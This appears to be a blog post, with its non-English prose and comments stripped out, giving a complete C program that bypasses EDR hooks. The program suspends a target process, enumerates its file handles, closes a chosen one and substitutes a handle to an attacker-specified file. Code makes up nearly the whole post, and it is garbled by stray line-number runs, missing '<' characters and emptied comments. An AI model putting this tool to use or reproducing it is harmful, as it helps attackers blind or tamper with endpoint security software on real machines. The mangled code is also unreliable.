Windows 
 pass edrhook
1.  - 
2.  NtSuspendProcess 
3.  NtQuerySystemInform  
4.  ObjectTypeIndex   ObjectTypeIndex 
5.  NtQueryInformation  
6.  DUPLICATE_CLOSE_SOURCE 
7.  1
8.  NtResumeProcess  
// 
if (NtSuspendProcess(hProcess) != 0) {
    CloseHandle(hProcess);
    return 1;
}
//  NtSuspendProcess 
NtSuspendProcess = (unsigned long (__stdcall *)(void *)) 
GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSuspendProcess");
if (NtSuspendProcess == NULL) {
    return 1;
}
1
2
3
4
5
6
7
8
9
10
11
#include 
#include 
#define SystemExtendedHandleInformation 64
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
1
2
3
4
5
#define FileNameInformation 9
#define PROCESS_SUSPEND_RESUME 0x800
struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    ULONG Object;
    ULONG UniqueProcessId;
    ULONG HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
};
struct SYSTEM_HANDLE_INFORMATION_EX {
    ULONG NumberOfHandles;
    ULONG Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleList[1];
};
struct FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
};
struct IO_STATUS_BLOCK {
    union {
        DWORD Status;
        PVOID Pointer;
    };
    DWORD *Information;
};
struct GetFileHandlePathThreadParamStruct {
    HANDLE hFile;
    char szPath[512];
};
DWORD
(WINAPI *NtQuerySystemInformation)(DWORD SystemInformationClass, PVOID 
SystemInformation, ULONG SystemInformationLength,
                                   PULONG ReturnLength);
DWORD (WINAPI *NtQueryInformationFile)(HANDLE FileHandle, void *IoStatusBlock, 
PVOID FileInformation, ULONG Length,
                                       DWORD FileInformationClass);
DWORD (WINAPI *NtSuspendProcess)(HANDLE Process);
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
DWORD (WINAPI *NtResumeProcess)(HANDLE Process);
SYSTEM_HANDLE_INFORMATION_EX *pGlobal_SystemHandleInfo = NULL;
DWORD dwGlobal_DebugObjectType = 0;
DWORD GetSystemHandleList() {
    DWORD dwAllocSize = 0;
    DWORD dwStatus = 0;
    DWORD dwLength = 0;
    BYTE *pSystemHandleInfoBuffer = NULL;
    if (pGlobal_SystemHandleInfo != NULL) {
        free(pGlobal_SystemHandleInfo);
    }
    // 
    dwAllocSize = 0;
    for (;;) {
        if (pSystemHandleInfoBuffer != NULL) {
            // 
            free(pSystemHandleInfoBuffer);
            pSystemHandleInfoBuffer = NULL;
        }
        if (dwAllocSize != 0) {
            // 
            pSystemHandleInfoBuffer = (BYTE *) malloc(dwAllocSize);
            if (pSystemHandleInfoBuffer == NULL) {
                return 1;
            }
        }
        dwStatus = NtQuerySystemInformation(SystemExtendedHandleInformation, (void 
*) pSystemHandleInfoBuffer,
                                            dwAllocSize, &dwLength);
        if (dwStatus == 0) {
            // 
            break;
        } else if (dwStatus == STATUS_INFO_LENGTH_MISMATCH) {
            // , 1kb
            dwAllocSize = (dwLength + 1024);
        } else {
            free(pSystemHandleInfoBuffer);
            return 1;
        }
    }
    // 
    pGlobal_SystemHandleInfo = (SYSTEM_HANDLE_INFORMATION_EX *) 
pSystemHandleInfoBuffer;
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
    return 0;
}
DWORD GetFileHandleObjectType(DWORD *pdwFileHandleObjectType) {
    HANDLE hFile = NULL;
    char szPath[512];
    DWORD dwFound = 0;
    DWORD dwFileHandleObjectType = 0;
    // exe
    memset(szPath, 0, sizeof(szPath));
    if (GetModuleFileName(NULL, szPath, sizeof(szPath) - 1) == 0) {
        return 1;
    }
    // exe
    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 
0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }
    // 
    if (GetSystemHandleList() != 0) {
        return 1;
    }
    CloseHandle(hFile);
    //
    for (DWORD i = 0; i NumberOfHandles; i++) {
        // ID
        if (pGlobal_SystemHandleInfo->HandleList[i].UniqueProcessId == 
GetCurrentProcessId()) {
            // 
            if (pGlobal_SystemHandleInfo->HandleList[i].HandleValue == (DWORD) 
hFile) {
                // 
                dwFileHandleObjectType = pGlobal_SystemHandleInfo-
>HandleList[i].ObjectTypeIndex;
                dwFound = 1;
                break;
            }
        }
    }
    // 
    if (dwFound == 0) {
        return 1;
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
    }
    // 
    *pdwFileHandleObjectType = dwFileHandleObjectType;
    return 0;
}
DWORD WINAPI GetFileHandlePathThread(LPVOID lpArg) {
    BYTE bFileInfoBuffer[2048];
    IO_STATUS_BLOCK IoStatusBlock;
    GetFileHandlePathThreadParamStruct *pGetFileHandlePathThreadParam = NULL;
    FILE_NAME_INFORMATION *pFileNameInfo = NULL;
    // 
    pGetFileHandlePathThreadParam = (GetFileHandlePathThreadParamStruct *) lpArg;
    // 
    memset((void *) &IoStatusBlock, 0, sizeof(IoStatusBlock));
    memset(bFileInfoBuffer, 0, sizeof(bFileInfoBuffer));
    if (NtQueryInformationFile(pGetFileHandlePathThreadParam->hFile, 
&IoStatusBlock, bFileInfoBuffer,
                               sizeof(bFileInfoBuffer), FileNameInformation) != 0) 
{
        return 1;
    }
    // get FILE_NAME_INFORMATION ptr
    pFileNameInfo = (FILE_NAME_INFORMATION *) bFileInfoBuffer;
    // 
    if (pFileNameInfo->FileNameLength >= sizeof(pGetFileHandlePathThreadParam-
>szPath)) {
        return 1;
    }
    //  ansi string
    wcstombs(pGetFileHandlePathThreadParam->szPath, pFileNameInfo->FileName,
             sizeof(pGetFileHandlePathThreadParam->szPath) - 1);
    return 0;
}
DWORD ReplaceFileHandle(HANDLE hTargetProcess, HANDLE hExistingRemoteHandle, 
HANDLE hReplaceLocalHandle) {
    HANDLE hClonedFileHandle = NULL;
    HANDLE hRemoteReplacedHandle = NULL;
    // 
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
    if (DuplicateHandle(hTargetProcess, hExistingRemoteHandle, 
GetCurrentProcess(), &hClonedFileHandle, 0, 0,
                        DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS) == 0) {
        return 1;
    }
    // 
    CloseHandle(hClonedFileHandle);
    //
    if (DuplicateHandle(GetCurrentProcess(), hReplaceLocalHandle, hTargetProcess, 
&hRemoteReplacedHandle, 0, 0,
                        DUPLICATE_SAME_ACCESS) == 0) {
        return 1;
    }
    // 
    if (hRemoteReplacedHandle != hExistingRemoteHandle) {
        return 1;
    }
    return 0;
}
DWORD HijackFileHandle(DWORD dwTargetPID, char *pTargetFileName, HANDLE 
hReplaceLocalHandle) {
    HANDLE hProcess = NULL;
    HANDLE hClonedFileHandle = NULL;
    DWORD dwFileHandleObjectType = 0;
    DWORD dwThreadExitCode = 0;
    DWORD dwThreadID = 0;
    HANDLE hThread = NULL;
    GetFileHandlePathThreadParamStruct GetFileHandlePathThreadParam;
    char *pLastSlash = NULL;
    DWORD dwHijackCount = 0;
    // 
    if (GetFileHandleObjectType(&dwFileHandleObjectType) != 0) {
        return 1;
    }
    printf("Opening process: %u...\n", dwTargetPID);
    // 
    hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, 0, 
dwTargetPID);
    if (hProcess == NULL) {
        return 1;
    }
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
    // 
    if (NtSuspendProcess(hProcess) != 0) {
        CloseHandle(hProcess);
        return 1;
    }
    // 
    if (GetSystemHandleList() != 0) {
        NtResumeProcess(hProcess);
        CloseHandle(hProcess);
        return 1;
    }
    for (DWORD i = 0; i NumberOfHandles; i++) {
        // 
        if (pGlobal_SystemHandleInfo->HandleList[i].ObjectTypeIndex != 
dwFileHandleObjectType) {
            continue;
        }
        // 
        if (pGlobal_SystemHandleInfo->HandleList[i].UniqueProcessId != 
dwTargetPID) {
            continue;
        }
        // new file handle
        if (DuplicateHandle(hProcess, (HANDLE) pGlobal_SystemHandleInfo-
>HandleList[i].HandleValue, GetCurrentProcess(),
                            &hClonedFileHandle, 0, 0, DUPLICATE_SAME_ACCESS) == 0) 
{
            continue;
        }
        // 
        // 
        memset((void *) &GetFileHandlePathThreadParam, 0, 
sizeof(GetFileHandlePathThreadParam));
        GetFileHandlePathThreadParam.hFile = hClonedFileHandle;
        hThread = CreateThread(NULL, 0, GetFileHandlePathThread, (void *) 
&GetFileHandlePathThreadParam, 0,
                               &dwThreadID);
        if (hThread == NULL) {
            CloseHandle(hClonedFileHandle);
            continue;
        }
        // 
        if (WaitForSingleObject(hThread, 1000) != WAIT_OBJECT_0) {
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
            // 
            TerminateThread(hThread, 1);
            CloseHandle(hThread);
            CloseHandle(hClonedFileHandle);
            continue;
        }
        CloseHandle(hClonedFileHandle);
        // 
        GetExitCodeThread(hThread, &dwThreadExitCode);
        if (dwThreadExitCode != 0) {
            CloseHandle(hThread);
            continue;
        }
        CloseHandle(hThread);
        // 
        pLastSlash = strrchr(GetFileHandlePathThreadParam.szPath, '\\');
        if (pLastSlash == NULL) {
            continue;
        }
        // 
        pLastSlash++;
        if (stricmp(pLastSlash, pTargetFileName) != 0) {
            continue;
        }
        // found matching filename
        printf("Found remote file handle: \"%s\" (Handle ID: 0x%X)\n", 
GetFileHandlePathThreadParam.szPath,
               pGlobal_SystemHandleInfo->HandleList[i].HandleValue);
        dwHijackCount++;
        // 
        if (ReplaceFileHandle(hProcess, (HANDLE) pGlobal_SystemHandleInfo-
>HandleList[i].HandleValue,
                              hReplaceLocalHandle) == 0) {
            // 
            printf("Remote file handle hijacked successfully\n\n");
        } else {
            // 
            printf("Failed to hijack remote file handle\n\n");
        }
    }
    // 
    if (NtResumeProcess(hProcess) != 0) {
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
        CloseHandle(hProcess);
        return 1;
    }
    // close handle
    CloseHandle(hProcess);
    // 
    if (dwHijackCount == 0) {
        printf("No matching file handles found\n");
        return 1;
    }
    return 0;
}
DWORD GetNtdllFunctions() {
    // get NtQueryInformationFile ptr
    NtQueryInformationFile = (unsigned long (__stdcall *)(void *, void *, void *, 
unsigned long,
                                                          unsigned long)) 
GetProcAddress(GetModuleHandle("ntdll.dll"),
      "NtQueryInformationFile");
    if (NtQueryInformationFile == NULL) {
        return 1;
    }
    // get NtQuerySystemInformation ptr
    NtQuerySystemInformation = (unsigned long (__stdcall *)(unsigned long, void *, 
unsigned long,
                                                            unsigned long *)) 
GetProcAddress(
            GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return 1;
    }
    // get NtSuspendProcess ptr
    NtSuspendProcess = (unsigned long (__stdcall *)(void *)) 
GetProcAddress(GetModuleHandle("ntdll.dll"),
"NtSuspendProcess");
    if (NtSuspendProcess == NULL) {
        return 1;
    }
    // get NtResumeProcess ptr
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
    NtResumeProcess = (unsigned long (__stdcall *)(void *)) 
GetProcAddress(GetModuleHandle("ntdll.dll"),
"NtResumeProcess");
    if (NtResumeProcess == NULL) {
        return 1;
    }
    return 0;
}
int main(int argc, char *argv[]) {
    DWORD dwPID = 0;
    char *pTargetFileName = NULL;
    char *pNewFilePath = NULL;
    HANDLE hFile = NULL;
    if (argc != 4) {
        printf("Usage : %s   \n\n", 
argv[0]);
        return 1;
    }
    // 
    dwPID = atoi(argv[1]);
    pTargetFileName = argv[2];
    pNewFilePath = argv[3];
    //  ntdll 
    if (GetNtdllFunctions() != 0) {
        return 1;
    }
    // 
    hFile = CreateFile(pNewFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ 
| FILE_SHARE_WRITE, NULL,
                       CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create file\n");
        return 1;
    }
    // 
    if (HijackFileHandle(dwPID, pTargetFileName, hFile) != 0) {
        printf("Error\n");
        // error handle
        CloseHandle(hFile);
        DeleteFile(pNewFilePath);
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
        return 1;
    }
    // close handle
    CloseHandle(hFile);
    printf("Finished\n");
    return 0;
}
411
412
413
414
415
416
417
418
419